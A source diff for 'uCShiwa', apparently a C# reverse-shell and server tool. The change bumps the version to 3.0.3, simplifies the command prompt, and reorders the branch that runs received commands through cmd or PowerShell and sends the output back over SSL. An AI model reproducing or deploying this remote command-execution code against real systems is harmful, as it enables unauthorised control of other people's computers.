@@ -47,7 +47,7 @@ namespace uCShiwa
             Console.WriteLine("                  #@@@                  ");
 
             Console.ForegroundColor = ConsoleColor.Red;
-            Console.WriteLine("-o uCShiwa v3.0.2");
+            Console.WriteLine("-o uCShiwa v3.0.3");
             Console.ResetColor();
 
             //SERVER MODE
@@ -91,6 +91,7 @@ namespace uCShiwa
 
                 while (client.Connected)
                 {
+
                     //send command
                     sendMsg(message, sslStream);
 
@@ -103,7 +104,7 @@ namespace uCShiwa
                     while (message == "")
                     {
                         Console.ForegroundColor = ConsoleColor.Red;
-                        Console.WriteLine("-o Enter next command:");
+                        Console.Write("-o >");
                         Console.ResetColor();
                         message = Console.ReadLine();
                     }
@@ -155,7 +156,7 @@ namespace uCShiwa
                         }
                     }
 
-                    //set powershellmode
+                    //set powershell mode
                     if (Regex.IsMatch(message, @"^pwsh "))
                     {
                         message = message.Replace("pwsh ", "");
@@ -166,13 +167,14 @@ namespace uCShiwa
                     }
 
                     //execute command
-                    if (pwsh == 0)
+
+                    if(pwsh != 0)
                     {
-                        message = executeCmd(message, currentWorkingDir, timeout);
+                        message = executePwsh(message);
                     }
                     else
                     {
-                        message = executePwsh(message);
+                        message = executeCmd(message, currentWorkingDir, timeout);
                     }
              
                     // send output
@@ -190,7 +192,6 @@ namespace uCShiwa
                 Console.WriteLine("Reverse shell mode: {0} <IP> <port>", executable);
                 return 1;
             }
-
             return 0;
         }
 
@@ -259,5 +260,6 @@ namespace uCShiwa
             }
             return message;
         }
+        
     }
 }
